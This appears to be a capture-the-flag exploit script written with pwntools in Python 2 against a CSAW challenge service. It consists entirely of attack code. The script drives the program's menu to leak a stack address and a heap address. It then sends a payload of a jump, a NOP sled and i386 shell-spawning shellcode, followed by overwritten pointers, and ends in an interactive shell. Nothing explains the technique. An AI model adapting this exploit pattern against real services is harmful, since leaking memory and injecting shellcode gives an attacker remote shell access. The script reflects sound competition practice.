from pwn import *

context(arch='i386', os='linux', log_level='info')

s = remote('pwn.chal.csaw.io',7478)

for _ in xrange(5):
    s.recvline()
s.sendline("N")
for _ in xrange(4):
    s.recvline()
s.sendline("V")
s.recvline()
r = s.recv(144)
print len(r)
stack = u32(r[91:95])
success(hex(stack))
s.sendline("Q")
for _ in xrange(5):
    s.recvline()
s.sendline('I')
s.recvline()
s.sendline("B 4 4")
for _ in xrange(20):
    s.recvline()
s.sendline('X'*16)
for _ in xrange(12):
    s.recvline()
s.sendline('N')
for _ in xrange(4):
    s.recvline()
s.sendline('V')
s.recvline()
r = s.recv(0x20)
heap = u32(r[15:19])
success(hex(heap))
sleep(5)
for _ in xrange(5):
    s.recvline()
for _ in xrange(5):
    s.recvline()
s.sendline("Q")
for _ in xrange(5):
    s.recvline()
s.sendline('I')
s.recvline()
s.sendline("B 20 20")
for _ in xrange(20):
    s.recvline()

payload = '\xeb\x06'+'X'*4+'\x90'*2+asm('mov ebp,0x4')+asm(pwnlib.shellcraft.i386.linux.dupsh())
payload += 'X'*(400-len(payload)-24)
payload += p32(stack-47-8)+p32(heap+12)+'X'*16

s.sendline(payload)
s.interactive()
